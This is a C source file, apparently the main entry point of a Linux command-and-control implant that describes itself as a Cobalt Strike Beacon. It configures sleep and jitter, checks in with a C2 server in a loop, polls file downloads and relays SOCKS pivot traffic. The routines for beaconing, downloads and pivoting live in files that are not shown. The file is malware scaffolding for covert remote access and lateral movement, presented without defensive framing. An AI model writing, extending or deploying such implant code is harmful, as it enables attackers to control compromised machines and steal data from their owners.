#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include "beacon.h"
#include "config.h"
#include "debug.h"
#include "files.h"
#include "pivot.h"
#include "profile_generated.h"

#define IMPLANT_VERSION "v2.3.7"

static int running = 1;

beacon_state_t *g_beacon_state = NULL;

int g_sleep_time_ms = PROFILE_SLEEP_TIME;
int g_jitter_percent = PROFILE_JITTER;


// Forward declaration for the callback function in commands.c
void pivot_callback_func(const char * buffer, int length, int type);

void signal_handler(int sig)
{
    (void)sig;
    running = 0;
}

int main(void)
{
    beacon_state_t state;
    
    // Set global beacon state
    g_beacon_state = &state;
    
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    DEBUG_PRINT("Linux Cobalt Strike Beacon %s\n", IMPLANT_VERSION);
    DEBUG_PRINT("C2 Server: %s:%d\n", C2_SERVER, C2_PORT);
    DEBUG_PRINT("Sleep: %dms, Jitter: %d%%\n", g_sleep_time_ms, g_jitter_percent);
    DEBUG_PRINT("HTTPS value: %d\n", C2_USE_HTTPS);
    
    // Initialize beacon
    if (beacon_init(&state) != 0) {
        DEBUG_PRINT("Failed to initialize beacon\n");
        return 1;
    }

    // Enforce minimum sleep to prevent flooding the teamserver with
    // GET/POST requests that would trigger "Dropped responses from session"
    // errors before the server has issued the first task.
    if (g_sleep_time_ms < 200) {
        g_sleep_time_ms = 200;
        g_jitter_percent = 0;
    }

    pivot_init();
    DEBUG_PRINT("Beacon initialized\n");

    // Initial check-in
    DEBUG_PRINT("Performing initial check-in...\n");

    // Main beacon loop
    while (running)
	{
        download_poll();
        // Check in with server
        if (beacon_checkin(&state) == 0)
		{
            DEBUG_PRINT("Check-in successful (%s)\n", IMPLANT_VERSION);
        }

        // Poll SOCKS sockets
        pivot_poll(pivot_callback_func);


        usleep(10000); // 10ms delay to prevent fast loops

        beacon_sleep();
    }
    
    DEBUG_PRINT("\n[*] Shutting down beacon...\n");
    pivot_cleanup();
    beacon_cleanup(&state);
    
    return 0;
}
